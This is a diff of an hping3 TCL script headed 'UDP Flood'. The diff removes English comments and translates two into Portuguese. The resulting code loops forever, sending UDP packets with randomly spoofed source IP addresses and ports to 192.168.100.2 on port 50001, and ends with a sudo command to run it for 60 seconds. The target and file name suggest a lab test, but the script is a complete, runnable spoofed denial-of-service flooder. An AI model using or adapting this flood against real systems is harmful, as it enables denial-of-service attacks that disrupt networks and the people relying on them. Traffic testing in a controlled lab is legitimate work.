@@ -1,15 +1,12 @@
 # Hping3 UDP Flood (0 bytes) with TCL script
-# UDP Flood (rand source IP and source port, dest port 50001, ttl=64, payload=0) for hping3 TCL mode
 
 set dst_ip "192.168.100.2"
 set dst_port 50001
 
-# Function to generate random IP address
 proc random_ip {} {
     return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
 }
 
-# Function to generate random source port (1024–65535)
 proc random_port {} {
     return [expr {int(rand()*64512) + 1024}]
 }
@@ -17,9 +14,9 @@ proc random_port {} {
 while {1} {
     set saddr [random_ip]
     set sport [random_port]
-    # UDP packet: random source IP, random source port, dest port 50001, TTL=64, empty payload
+    # Pacote UDP: random source IP, random source port, dest port 50001, TTL=64, empty payload
     set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+udp(sport=$sport,dport=$dst_port)"
     hping send $pkt
 }
 
-# To run: sudo timeout -s INT 60 hping3 exec hping3_test_udp_0bytes_flood_TCL.htcl
+# Comando: sudo timeout -s INT 60 hping3 exec hping3_test_udp_0bytes_flood_TCL.htcl
